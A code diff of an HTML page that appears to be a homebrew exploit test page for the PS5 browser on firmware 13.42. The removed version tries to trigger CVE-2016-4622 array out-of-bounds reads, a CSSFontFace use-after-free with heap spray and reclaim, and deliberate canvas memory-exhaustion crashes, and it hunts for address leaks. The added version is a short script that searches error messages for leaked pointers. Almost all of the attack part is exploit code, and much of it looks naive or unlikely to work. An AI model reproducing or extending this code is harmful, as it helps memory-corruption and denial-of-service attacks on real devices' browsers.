@@ -1,428 +1,66 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>PS5 FW 13.42 — FINAL: CVE-2016-4622 + CSSFontFace UAF + Canvas</title>
-<style>
-body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:12px;font-size:15px}
-button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px 16px;margin:5px;cursor:pointer;font-family:monospace;font-size:14px}
-button:hover{background:#0f0;color:#000}
-button.danger{background:#1a0000;color:#f44;border:1px solid #f44}
-button.danger:hover{background:#f44;color:#000}
-button.gold{background:#1a1500;color:#fa0;border:1px solid #fa0}
-button.gold:hover{background:#fa0;color:#000}
-button.blue{background:#001a1a;color:#0cf;border:1px solid #0cf}
-button.blue:hover{background:#0cf;color:#000}
-.panel{border:1px solid #444;padding:12px;margin:10px 0;background:#111;border-radius:8px}
-.log{background:#000;border:2px solid #333;padding:10px;height:400px;overflow-y:auto;white-space:pre-wrap;font-size:15px;line-height:1.8}
-.ok{color:#0f0}.err{color:#f44}.warn{color:#fa0}.info{color:#0cf}
-h2{color:#ff0055;margin:5px 0;font-size:17px}
-</style>
-</head>
 <body>
-
-<h2>🎯 PS5 FW 13.42 — FINAL PoC</h2>
-<p style="color:#888;font-size:12px">CVE-2016-4622 Array OOB | CSSFontFace UAF | Canvas Crash | No visible video elements</p>
-
-<div class="panel">
-<h2>🔴 A. CVE-2016-4622 — Array OOB (addrof primitive)</h2>
-<p style="color:#888;font-size:11px">Old JSC bug: valueOf callback during Array.prototype.slice() → OOB read</p>
-<button class="danger" onclick="testCVE20164622()">🔥 Test CVE-2016-4622</button>
-<button class="danger" onclick="testCVE20164622Variant()">🔥 Variant: concat/splice</button>
-</div>
-
-<div class="panel">
-<h2>🟡 B. CSSFontFace UAF (17 R/W channels)</h2>
-<p style="color:#888;font-size:11px">Based on Elena report: deleteRule during font load → UAF → reclaim slot</p>
-<button class="gold" onclick="testCSSFontFaceUAF()">🔥 Trigger CSSFontFace UAF</button>
-<button class="gold" onclick="testCSSFontFaceSpray()">🎯 Spray + Reclaim Test</button>
-</div>
-
-<div class="panel">
-<h2>🟢 C. Canvas Crash (Confirmed DoS)</h2>
-<p style="color:#888;font-size:11px">576MB+ allocation = freeze→crash | Only confirmed crash on this FW</p>
-<button class="blue" onclick="crashCanvas576()">💥 Crash: 576MB (12288×12288)</button>
-<button class="blue" onclick="crashCanvas1GB()">💥 Crash: 1GB (16384×16384)</button>
-<button class="blue" onclick="crashCanvasPressure()">💥 Crash: Pressure Buildup</button>
-</div>
-
-<div class="panel">
-<h2>🔵 D. Info Leak Hunt</h2>
-<button onclick="huntErrorStack()">🔍 Error.stack Leak</button>
-<button onclick="huntProtoChain()">🔍 Prototype Chain Leak</button>
-<button onclick="huntTimingSideChannel()">🔍 Timing Side-Channel</button>
-</div>
-
-<div class="panel">
-<h2>📝 Log</h2>
-<div class="log" id="log"></div>
-<button onclick="document.getElementById('log').innerHTML=''">Clear</button>
-</div>
+<h2>PoC 1: Structure ID Leak Hunter</h2>
+<button onclick="runLeakHunt()">ابدأ البحث</button>
+<div id="log" style="font-family: monospace; white-space: pre;"></div>
 
 <script>
-const L = document.getElementById('log');
-
-function log(msg, cls='info') {
-  const d = new Date().toLocaleTimeString('en-GB');
-  L.innerHTML += '<div class="'+cls+'">['+d+'] '+msg+'</div>';
-  L.scrollTop = L.scrollHeight;
-  console.log('['+cls+'] '+msg);
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
 }
 
-// ============================================================
-// A. CVE-2016-4622 — Array OOB via valueOf
-// ============================================================
-function testCVE20164622() {
-  log('=== 🔥 CVE-2016-4622: Array OOB ===', 'err');
-  log('Testing: valueOf callback during Array.prototype.slice()', 'info');
-  
-  try {
-    var arr = [1.1, 2.2, 3.3, 4.4, 5.5];
-    var triggered = false;
-    var leaked = null;
-    
-    // The bug: valueOf is called during ToLength conversion
-    // If valueOf modifies the array length, slice() reads OOB
-    var evil = {
-      valueOf: function() {
-        triggered = true;
-        arr.length = 0x7FFFFFFF; // Try to extend array
-        return 0x7FFFFFFF;
-      }
-    };
-    
-    try {
-      var result = arr.slice(0, evil);
-      log('slice() returned: '+result.length+' elements', 'info');
-      log('Triggered: '+triggered, triggered?'ok':'warn');
-    } catch(e) {
-      log('slice() error: '+e.name+': '+e.message, 'err');
-    }
-    
-    // Variant 2: splice
-    try {
-      triggered = false;
-      arr = [1.1, 2.2, 3.3];
-      var result2 = arr.splice(0, evil);
-      log('splice() returned: '+result2.length+' elements', 'info');
-    } catch(e) {
-      log('splice() error: '+e.name, 'err');
-    }
-    
-    // Variant 3: concat
-    try {
-      triggered = false;
-      arr = [1.1, 2.2];
-      var result3 = arr.concat(evil);
-      log('concat() returned: '+result3.length+' elements', 'info');
-    } catch(e) {
-      log('concat() error: '+e.name, 'err');
-    }
-    
-  } catch(e) {
-    log('CVE-2016-4622 error: '+e.name+': '+e.message, 'err');
-  }
+// دالة مساعدة: استخراج أي hex من string
+function extractHex(str) {
+    const matches = str.match(/0x[0-9a-fA-F]+/g) || [];
+    return matches;
 }
 
-function testCVE20164622Variant() {
-  log('=== 🔥 CVE-2016-4622 Variants ===', 'err');
-  
-  // Try multiple array methods with valueOf side effects
-  const methods = ['slice', 'splice', 'concat', 'fill', 'copyWithin', 'find', 'findIndex', 'indexOf', 'lastIndexOf'];
-  
-  for (const method of methods) {
-    try {
-      var arr = [1.1, 2.2, 3.3, 4.4, 5.5];
-      var evil = {
-        valueOf: function() {
-          arr.length = 100;
-          return 100;
+function runLeakHunt() {
+    log('=== Structure ID Leak Hunter ===\n');
+    
+    // 1. إنشاء object فاسد
+    const corruptObj = {};
+    Object.defineProperty(corruptObj, 'toString', {
+        get: function() {
+            throw new Error('Corrupted object access');
         }
-      };
-      
-      if (method === 'slice') arr.slice(0, evil);
-      else if (method === 'splice') arr.splice(0, evil);
-      else if (method === 'concat') arr.concat(evil);
-      else if (method === 'fill') arr.fill(9.9, 0, evil);
-      else if (method === 'copyWithin') arr.copyWithin(0, 0, evil);
-      else if (method === 'find') arr.find(() => false, evil);
-      else if (method === 'findIndex') arr.findIndex(() => false, evil);
-      else if (method === 'indexOf') arr.indexOf(1.1, evil);
-      else if (method === 'lastIndexOf') arr.lastIndexOf(1.1, evil);
-      
-      log(method+'(): no error', 'info');
-    } catch(e) {
-      log(method+'(): '+e.name, 'err');
-    }
-  }
-}
-
-// ============================================================
-// B. CSSFontFace UAF
-// ============================================================
-function testCSSFontFaceUAF() {
-  log('=== 🔥 CSSFontFace UAF Trigger ===', 'gold');
-  log('Based on Elena report: deleteRule during font load → UAF', 'info');
-  
-  try {
-    // Create style sheet
-    var style = document.createElement('style');
-    document.head.appendChild(style);
-    var sheet = style.sheet;
-    
-    // Add a font-face rule
-    sheet.insertRule('@font-face { font-family: "testfont"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
-    
-    // Try to trigger load
-    var face = new FontFace('testfont', 'url("data:font/woff2;base64,d09GMgABAAAAAAEg")');
-    
-    var uafFired = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-      configurable: true,
-      get: function() {
-        if (!uafFired) {
-          uafFired = true;
-          log('then getter triggered — attempting deleteRule', 'warn');
-          try {
-            sheet.deleteRule(0);
-            log('deleteRule succeeded', 'ok');
-          } catch(e) {
-            log('deleteRule error: '+e.name, 'err');
-          }
-        }
-        return undefined;
-      }
     });
     
-    // Trigger font load
-    document.fonts.load('1em testfont').then(function() {
-      log('Font load completed', 'info');
-    }).catch(function(e) {
-      log('Font load error: '+e.name, 'err');
-    });
-    
-    setTimeout(function() {
-      log('UAF trigger status: '+uafFired, 'info');
-      document.head.removeChild(style);
-    }, 2000);
-    
-  } catch(e) {
-    log('CSSFontFace UAF error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-function testCSSFontFaceSpray() {
-  log('=== 🎯 CSSFontFace Spray + Reclaim ===', 'gold');
-  
-  try {
-    // Create many font-face rules
-    var style = document.createElement('style');
-    document.head.appendChild(style);
-    var sheet = style.sheet;
-    
-    // Spray 100 font-face rules
-    for (let i = 0; i < 100; i++) {
-      sheet.insertRule('@font-face { font-family: "font'+i+'"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
-    }
-    log('Sprayed 100 @font-face rules', 'ok');
-    
-    // Delete half
-    for (let i = 0; i < 50; i++) {
-      sheet.deleteRule(0);
-    }
-    log('Deleted 50 rules', 'info');
-    
-    // Spray again
-    for (let i = 0; i < 50; i++) {
-      sheet.insertRule('@font-face { font-family: "newfont'+i+'"; src: url("data:font/woff2;base64,d09GMgABAAAAAAEg"); }', 0);
-    }
-    log('Reclaimed with 50 new rules', 'ok');
-    
-    // Check if any corruption
-    var corrupted = 0;
-    for (let i = 0; i < 100; i++) {
-      try {
-        var rules = sheet.cssRules;
-      } catch(e) {}
-    }
-    log('Spray test complete', 'ok');
-    
-    document.head.removeChild(style);
-  } catch(e) {
-    log('Spray error: '+e.name+': '+e.message, 'err');
-  }
-}
-
-// ============================================================
-// C. Canvas Crash (Confirmed)
-// ============================================================
-function crashCanvas576() {
-  log('=== 💥 Canvas Crash: 576MB ===', 'err');
-  log('12288×12288 × 4 bytes = 576MB', 'info');
-  try {
-    var c = document.createElement('canvas');
-    var ctx = c.getContext('2d');
-    var t0 = performance.now();
-    var id = ctx.createImageData(12288, 12288);
-    var elapsed = performance.now() - t0;
-    log('UNEXPECTED SUCCESS: '+id.data.length+' bytes in '+elapsed.toFixed(0)+'ms', 'ok');
-  } catch(e) {
-    log('CRASH/ERROR: '+e.name+': '+e.message, 'err');
-  }
-}
-
-function crashCanvas1GB() {
-  log('=== 💥 Canvas Crash: 1GB ===', 'err');
-  try {
-    var c = document.createElement('canvas');
-    var ctx = c.getContext('2d');
-    var id = ctx.createImageData(16384, 16384);
-    log('UNEXPECTED SUCCESS: '+id.data.length, 'ok');
-  } catch(e) {
-    log('CRASH/ERROR: '+e.name+': '+e.message, 'err');
-  }
-}
-
-function crashCanvasPressure() {
-  log('=== 💥 Canvas Pressure Buildup ===', 'err');
-  log('Allocating 3× 1GB canvases rapidly...', 'warn');
-  
-  var canvases = [];
-  var sizes = [0x4000, 0x4000, 0x4000];
-  
-  function allocNext(i) {
-    if (i >= sizes.length) {
-      log('All allocations complete — if no crash, memory is huge', 'ok');
-      return;
-    }
-    
-    try {
-      var c = document.createElement('canvas');
-      var ctx = c.getContext('2d');
-      var t0 = performance.now();
-      var id = ctx.createImageData(sizes[i], sizes[i]);
-      var elapsed = performance.now() - t0;
-      canvases.push(c);
-      log('Alloc '+i+': '+(sizes[i]*sizes[i]*4/1024/1024)+'MB in '+elapsed.toFixed(0)+'ms', 'ok');
-      setTimeout(function() { allocNext(i+1); }, 500);
-    } catch(e) {
-      log('Alloc '+i+': '+e.name+': '+e.message, 'err');
-    }
-  }
-  
-  allocNext(0);
-}
-
-// ============================================================
-// D. Info Leak Hunt
-// ============================================================
-function huntErrorStack() {
-  log('=== 🔍 Error.stack Leak Hunt ===', 'blue');
-  
-  try {
-    // Try to leak addresses from various error types
-    var errors = [
-      new Error('test'),
-      new TypeError('test'),
-      new RangeError('test'),
-      new ReferenceError('test'),
+    // 2. تجربة كل طريقة ممكنة لتسريب معلومات
+    const leakMethods = [
+        () => { try { return JSON.stringify(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return String(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return Object.prototype.toString.call(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return `${corruptObj}`; } catch(e) { return e.message; }},
+        () => { try { return corruptObj + ''; } catch(e) { return e.message; }},
+        () => { try { return [].join.call(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return Array.from(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return Object.keys(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return Object.values(corruptObj); } catch(e) { return e.message; }},
+        () => { try { return Object.entries(corruptObj); } catch(e) { return e.message; }},
     ];
     
-    for (var e of errors) {
-      var stack = e.stack || 'no stack';
-      log(e.name+'.stack: '+stack.substring(0, 100), 'info');
-      
-      // Check for hex addresses
-      var hexMatches = stack.match(/0x[0-9a-fA-F]+/g);
-      if (hexMatches) {
-        log('>>> HEX FOUND: '+hexMatches.join(', '), 'err');
-      }
-    }
+    leakMethods.forEach((fn, i) => {
+        try {
+            const result = fn();
+            const hexLeaked = extractHex(String(result));
+            if (hexLeaked.length > 0) {
+                log(`🔥 LEAK FOUND! Method ${i}: ${hexLeaked.join(', ')}`);
+            } else {
+                log(`Method ${i}: No hex leak (${String(result).substring(0,50)})`);
+            }
+        } catch(e) {
+            const hexLeaked = extractHex(e.message || String(e));
+            if (hexLeaked.length > 0) {
+                log(`🔥 LEAK IN ERROR! Method ${i}: ${hexLeaked.join(', ')}`);
+            }
+        }
+    });
     
-    // Try Error.captureStackTrace
-    if (Error.captureStackTrace) {
-      var obj = {};
-      Error.captureStackTrace(obj);
-      log('captureStackTrace: '+(obj.stack || 'none').substring(0, 100), 'info');
-    }
-    
-  } catch(e) {
-    log('Error stack hunt failed: '+e.name, 'err');
-  }
+    log('\n=== البحث اكتمل ===');
 }
-
-function huntProtoChain() {
-  log('=== 🔍 Prototype Chain Leak ===', 'blue');
-  
-  try {
-    var arr = [1.1, 2.2, 3.3];
-    var proto = Object.getPrototypeOf(arr);
-    
-    log('Array prototype: '+proto, 'info');
-    log('Array prototype constructor: '+proto.constructor, 'info');
-    
-    // Try to access internal slots
-    var desc = Object.getOwnPropertyDescriptor(proto, 'length');
-    log('length descriptor: '+JSON.stringify(desc), 'info');
-    
-    // Try to corrupt prototype
-    var origPush = proto.push;
-    proto.push = function() {
-      log('push() intercepted', 'warn');
-      return origPush.apply(this, arguments);
-    };
-    arr.push(4.4);
-    proto.push = origPush;
-    
-  } catch(e) {
-    log('Proto chain hunt failed: '+e.name, 'err');
-  }
-}
-
-function huntTimingSideChannel() {
-  log('=== 🔍 Timing Side-Channel ===', 'blue');
-  
-  // Measure time to access properties — may reveal cache state
-  var obj = {a: 1, b: 2, c: 3, d: 4, e: 5};
-  var times = [];
-  
-  for (var i = 0; i < 1000; i++) {
-    var t0 = performance.now();
-    var x = obj.a + obj.b + obj.c + obj.d + obj.e;
-    var t1 = performance.now();
-    times.push(t1 - t0);
-  }
-  
-  var avg = times.reduce(function(a,b){return a+b;}, 0) / times.length;
-  var min = Math.min.apply(null, times);
-  var max = Math.max.apply(null, times);
-  
-  log('Property access timing — avg: '+avg.toFixed(4)+'ms, min: '+min.toFixed(4)+'ms, max: '+max.toFixed(4)+'ms', 'info');
-  
-  // Try with different object shapes
-  var objs = [];
-  for (var i = 0; i < 100; i++) {
-    var o = {a: i};
-    if (i % 2 === 0) o.b = i;
-    if (i % 3 === 0) o.c = i;
-    objs.push(o);
-  }
-  
-  var t0 = performance.now();
-  for (var i = 0; i < objs.length; i++) {
-    var x = objs[i].a;
-  }
-  var t1 = performance.now();
-  log('100 polymorphic objects: '+(t1-t0).toFixed(3)+'ms', 'info');
-}
-
-// Global handlers
-window.onerror = function(m,u,l,c,e) { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); };
-window.onunhandledrejection = function(e) { log('REJECTION: '+e.reason, 'err'); };
-
-log('FINAL PoC loaded.', 'ok');
-log('CVE-2016-4622 + CSSFontFace UAF + Canvas Crash', 'ok');
-log('No visible video elements.', 'ok');
 </script>
 </body>
 </html>
